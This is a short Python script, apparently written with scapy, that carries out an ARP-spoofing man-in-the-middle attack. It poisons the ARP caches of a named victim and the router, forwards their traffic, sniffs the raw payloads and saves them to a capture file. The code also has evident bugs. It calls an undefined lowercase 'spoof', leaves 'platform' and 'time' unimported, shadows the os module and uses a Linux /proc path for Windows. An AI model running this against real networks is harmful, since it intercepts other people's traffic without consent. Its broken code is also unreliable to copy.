import os
import sys
from scapy.all import*

interface = raw_input("interface: \n")
victimIP = raw_input("victim: \n")
routerIP = raw_input("router: \n")


def MACsnag(IP):
    ans, unans = arping(IP)
    for s, r in ans:
        return r[Ether].src


def Spoof(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC))


def Restore(routerIP, victimIP):
    victimMAC = MACsnag(victimIP)
    routerMAC = MACsnag(routerIP)
    send(ARP(op=2, pdst=routerIP, psrc=victimIP,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=4)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=4)


def sniffer():
    pkts = sniff(iface=interface, count=10, prn=lambda x: x.sprintf(
        " Source: %IP.src% : %Ether.src%, \n %Raw.load% \n\n Reciever: %IP.dst% \n +=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+=+\n"))
    wrpcap("temp.pcap", pkts)


def ipforwarding(forward=True):
    os = platform.system().lower()

    if 'darwin' in os: # MAC_OS_X
        os.system("sudo sysctl -w net.inet.ip.forwarding=%d",forward)
    elif 'windows' in os: # WINDOWS
        os.system("echo %d > /proc/sys/net/ipv4/ip_forward",forward)
    else:
        os.system("echo %d > /proc/sys/net/ipv4/ip_forward",forward)

def MiddleMan():
    ipforwarding(True)
    while 1:
        try:
            spoof(routerIP, victimIP)
            time.sleep(1)
            sniffer()
        except KeyboardInterrupt:
            Restore(routerIP, victimIP)
            ipforwarding(False)
            sys.exit(1)


if __name__ == "__main__":
    MiddleMan()
